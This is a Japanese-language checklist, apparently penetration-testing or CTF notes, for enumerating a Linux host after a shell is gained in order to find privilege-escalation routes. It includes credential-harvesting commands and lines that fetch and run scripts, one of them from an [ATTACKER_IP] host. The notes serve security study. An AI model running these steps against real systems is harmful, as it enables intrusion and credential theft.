# Linux 侵入後 列挙チェックリスト

> **スコープ**: Linux シェル取得直後の権限昇格候補の全体確認に徹する。各手法の詳細は `Capabilities.md` / `SUID_SGID.md` / `Sudo_Misconfig.md` / `Kernel_Exploits.md` を参照。

## 着火条件

Linux ホストでシェル取得直後（SSH / リバースシェル / Web シェル経由を問わない）。

---

シェルを取得したら、権限昇格の糸口を探すために以下を順番に確認する。
**優先度「高」を全て確認してから「中」「低」に移る。**

---

## 優先度：高

### 現在のユーザーと権限
```bash
id
whoami
groups
```

**`id` 出力の読み方 — グループに着目する：**

`id` の出力には `uid`・`gid`・`groups` が含まれる。**特権昇格の糸口はグループに隠れていることが多い。**

```
uid=1000([USER]) gid=1000([USER]) groups=1000([USER]),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),50(staff)
```

権限昇格に直結しうるグループ一覧：

| グループ | 何ができるか | 攻撃の観点 |
|---------|-------------|-----------|
| `sudo` / `wheel` | sudo コマンドが使える | `sudo -l` で確認 |
| `docker` | Docker デーモンへのアクセス | コンテナ経由でホスト root ファイルアクセス |
| `lxd` / `lxc` | LXD コンテナの操作 | 特権コンテナでホストマウント → root |
| `disk` | `/dev/sda` 等のブロックデバイス直接読み書き | `debugfs` で `/etc/shadow` 直読み |
| `shadow` | `/etc/shadow` の読み取り | ハッシュを取得してクラック |
| `adm` | `/var/log/` の読み取り | ログからパスワード・セッション情報を探す |
| `staff` | `/usr/local/bin`, `/usr/local/sbin` への書き込み | PATH ハイジャック → root が実行するスクリプトへの注入 |
| `video` | フレームバッファ（画面）の読み取り | スクリーンショット取得（※手法未記載） |
| `kmem` | カーネルメモリの読み取り | カーネルレベルの情報漏洩（※手法未記載） |

**`staff` グループが特に重要な理由：**
`/usr/local/sbin` および `/usr/local/bin` は多くの Linux システムで `PATH` の最前列にある。root が `run-parts` や他のコマンドを**フルパスなしで実行する**スクリプト（PAM の MOTD 処理等）が動いている場合、この場所に同名のバイナリを置くだけで root として実行させられる。

> 原理 → `../06_Concepts/PAM.md`（SSHログイン時のPAMスタックとPATH）

### Linux Capabilities（最重要）
```bash
getcap -r / 2>/dev/null
```

**着眼点：** 以下の Capabilities が設定されたバイナリがあれば権限昇格の可能性が高い。

| Capability | 危険な理由 |
|-----------|-----------|
| `cap_setuid` | setuid(0) で root に変身できる |
| `cap_setgid` | setgid(0) で root グループに入れる |
| `cap_net_raw` | パケットキャプチャが可能 |
| `cap_sys_ptrace` | プロセスへのデバッガアタッチ |
| `cap_dac_override` | ファイルのパーミッションを無視して読み書き |

→ 詳細: `Capabilities.md`

### SUID / SGID バイナリ
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

**着眼点：** 標準バイナリ（`find`, `vim`, `python`, `perl`, `bash`等）に SUID が設定されていれば GTFOBins で悪用方法を確認する。

→ 詳細: `SUID_SGID.md`

### sudo 権限
```bash
sudo -l
```

**着眼点：** `NOPASSWD` で実行できるコマンドがあれば GTFOBins で確認する。

→ 詳細: `Sudo_Misconfig.md`

---

> **優先度「高」で権限昇格の糸口が見つからなかった場合は、そのまま優先度「中」の確認へ進む。**
> `sudo -l` が空・Capabilities なし・悪用できる SUID なし、という状態は珍しくない。
> 「中」のホームディレクトリ確認（`.bundle/config` / `.bash_history` / `.ssh/`）や内部サービス確認で認証情報・横移動経路が見つかることが多い。

---

## 優先度：中

### 実行中プロセス（rootが実行しているプロセスに注目）
```bash
ps aux
ps aux | grep root
```

**`ps aux` だけでは見えない短命プロセス（SSH ログイン引き金 / cron 系）には `pspy` を使う：**

`update-motd.d` のスクリプトや cron で動く root プロセスは数百ミリ秒で完結することが多く、`ps aux` のスナップショットでは捕捉できない。**`staff` / `lxd` グループに所属していて PATH ハイジャック・cron スクリプト改竄が候補に上がっている場合は、列挙の早い段階で pspy を導入する。**

```bash
# [Target] pspy をバックグラウンドで起動
/tmp/pspy64 -i 1000

# [Attacker] 別端末から SSH 再ログインを引き金に張ると、UID=0 のプロセスが pspy 出力に流れる
```

→ 詳細手順（バイナリ取得・転送・出力の読み方・シグナル別の次の手）: `../05_Tools_Reference/pspy.md`

### ネットワーク接続（内部サービスの確認）
```bash
ss -tlnp
netstat -tlnp 2>/dev/null
```

**着眼点：** `127.0.0.1` にバインドされているサービス（外部から見えないサービス）は、内部からアクセスできる可能性がある。

### Dockerコンテナ環境かどうかの確認

シェルを取得したら早期に「自分がコンテナ内にいるか」を確認する。コンテナ内にいる場合、ホストへの脱出経路を探す必要がある。

```bash
# 方法1: /etc/hosts でホスト名と IP を確認
cat /etc/hosts
# ホスト名がランダムな16進文字列 かつ IPが 172.17.0.x → Docker コンテナ
# 例: 172.17.0.2   [CONTAINER_ID]

# 方法2: 自分の IP アドレスを確認
ip addr show
hostname -I
# 172.17.0.x であればDockerデフォルトブリッジネットワーク上にいる

# 方法3: /.dockerenv の存在を確認
ls /.dockerenv 2>/dev/null && echo "コンテナ内"

# 方法4: cgroup の確認
cat /proc/1/cgroup | grep -i docker
```

**コンテナ内と判断したら確認すること：**

```bash
# ブロックデバイスが見えるか（ホスト breakout の前提条件）
ls /dev/sd* /dev/vd* 2>/dev/null

# マウント状況の確認
cat /proc/mounts

# 実行中コンテナの特権モードの確認（privileged だと breakout が容易）
cat /proc/self/status | grep -i "capeff\|capbnd"
# CapEff や CapBnd が 0000003fffffffff（全権限）なら privileged コンテナ
```

**コンテナIDはホストへの sudo docker exec 悪用時に必要：**
`/etc/hosts` のホスト名（例: `[CONTAINER_ID]`）がコンテナIDとして使える。

→ sudo docker exec の悪用: `Sudo_Misconfig.md`（パターン4）
→ IPレンジと環境の対応: `../01_Reconnaissance/Network_Scanning.md`（IPアドレスレンジから環境を読む）

### システムメールの確認

```bash
cat /var/mail/$(whoami)
ls /var/mail/
```

**着眼点：** システムメールには管理者からの通知・cronジョブの出力・セキュリティ警告が届いていることがある。「〜の脆弱性が危険」「パッチを当てろ」という内容があれば、そこに記載の CVE / 技術名を権限昇格の手がかりにする。

### 環境変数
```bash
env
cat /proc/1/environ 2>/dev/null | tr '\0' '\n'
```

### ホームディレクトリの確認
```bash
ls -la /home/
ls -la ~/
cat ~/.bash_history
cat ~/.ssh/
```

**着眼点：**

- `.bash_history` に平文パスワードが残っていることがある
- `.ssh/id_rsa` がある場合は他ホストへのSSH接続に使える
- **Ruby アプリのプロセス（ruby / unicorn / puma）として侵入した場合は `.bundle/config` を確認する**

```bash
# [Target] Bundler の設定ファイル（RubyGems 認証情報が平文で入っていることがある）
cat ~/.bundle/config
# 出力例: BUNDLE_HTTPS://RUBYGEMS__ORG/: "[USER]:[PASSWORD]"
#   → "[USER]:[PASSWORD]" のうち前半がユーザー名、後半がパスワード

# 全ユーザーのホームディレクトリを一括確認
for u in $(ls /home/); do echo "=== $u ==="; cat /home/$u/.bundle/config 2>/dev/null; done
```

→ 取得した認証情報の確認手順: `../02_Initial_Access/Credential_Discovery.md`（パターン8 と「認証情報を取得したら必ず試すこと」）

### 設定ファイル・パスワードファイルの探索
```bash
find / -name "*.conf" -o -name "*.config" -o -name "config.php" 2>/dev/null | head -20
grep -r "password\|passwd\|secret" /etc/ 2>/dev/null | grep -v "Binary" | head -20
```

---

## 優先度：低

### Crontab（定期実行タスク）
```bash
crontab -l
cat /etc/cron*
ls -la /etc/cron*
cat /var/spool/cron/crontabs/* 2>/dev/null
```

**着眼点：** root が実行しているスクリプトが書き込み可能であれば権限昇格できる。

### 書き込み可能なディレクトリ・ファイル
```bash
# 書き込み可能なディレクトリ
find / -writable -type d 2>/dev/null | grep -v "proc\|sys\|dev\|run"

# /etc 配下の書き込み可能なファイル
find /etc -writable -type f 2>/dev/null
```

### OS・カーネルバージョン（カーネルエクスプロイトの確認）
```bash
uname -a
cat /etc/os-release
```

**着眼点：** `uname -a` の出力からカーネルバージョンとビルド日時を確認する。

```
Linux hostname 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64
                ^^^^^^^^^^^^^^^^^^^^^^^^             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                カーネルバージョン                    ビルド日時（古いほど未パッチのCVEが存在する可能性）
```

ビルド日時が古い場合（目安：2年以上前）は `searchsploit linux kernel [バージョン]` で既知CVEを確認する。
`/var/mail/[USERNAME]` に特定の脆弱性への言及があれば、そのCVEを最優先に調べる。

→ 詳細手順（CVE選択・PoC転送・コンパイル・実行）: `Kernel_Exploits.md`

### インストール済みパッケージ・バージョン
```bash
dpkg -l 2>/dev/null | head -50
rpm -qa 2>/dev/null | head -50
```

---

## 自動列挙ツール

手動確認後、より広範な調査に使う：

```bash
# LinPEAS（最も網羅的）
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# ターゲットからインターネットに出られない場合（閉じたネットワーク）:
# [Attacker] python3 -m http.server 8000 でHTTPサーバーを起動し
# [Target] wget http://[ATTACKER_IP]:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
# → ファイル転送の詳細: Kernel_Exploits.md のファイル転送パターンを参照

# LinEnum
./LinEnum.sh

# linux-smart-enumeration
./lse.sh -l 1
```

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| `sudo -l` でパスワードを要求されるが不明 | 他の認証情報発見手法（`.env` / `.bash_history` / config ファイル）でパスワードを探す |
| SUID/SGID が見つかるが GTFOBins にない | `../06_Concepts/` の関連概念ファイルで原理を確認 / 自前で悪用方法を考える |
| カーネルバージョンに CVE が見つからない | パッチ済み。Capabilities / cron / PATH ハイジャック / sudo 設定の確認に切り替える |
| `pspy` を動かしてもroot プロセスが湧かない | 引き金がタイミング依存。SSH 再ログイン / 特定時刻待ちで再観察（`../05_Tools_Reference/pspy.md`）|
| 権限昇格パスが見つからない | `./Kernel_Exploits.md` のカーネル CVE を最後の手段として試す |

---

## 関連技術
- 前：SSH 経由でシェル取得（認証突破・秘密鍵・制限シェル脱出後） → `../02_Initial_Access/SSH.md`
- 前：リバースシェル取得直後の安定化 → `./Shell_Stabilization.md`
- 後：Capabilities 発見 → `./Capabilities.md`
- 後：SUID 発見 → `./SUID_SGID.md`
- 後：sudo 権限 → `./Sudo_Misconfig.md`
- 後：staff グループ / PAM 経由の昇格 → `./PAM_Misconfig.md`
- 後：カーネルバージョンが古い / システムメールに脆弱性の言及あり → `./Kernel_Exploits.md`
